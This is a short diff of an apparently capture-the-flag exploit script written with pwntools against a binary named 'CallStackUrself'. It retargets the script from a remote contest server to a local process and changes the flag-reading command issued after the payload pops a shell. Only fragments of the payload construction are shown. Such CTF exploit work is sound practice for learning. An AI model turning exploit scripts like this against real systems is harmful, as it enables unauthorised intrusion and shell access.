@@ -1,8 +1,7 @@
 from pwn import *
 
 context.log_level = 'debug'
-#s = process('./CallStackUrself')
-s = remote('octf.hacklab.kr' ,30045)
+s = process('./CallStackUrself')
 e = ELF('./CallStackUrself')
 
 
@@ -45,6 +44,6 @@ payload += p64(0)*10 # setting NULL to stack for oneshot
 
 s.sendline(payload) # enjoy your shell
 s.recv()
-s.sendline('cat /home/csuself/flag')
+s.sendline('cat flag')
 s.interactive() # by pwnWiz
 
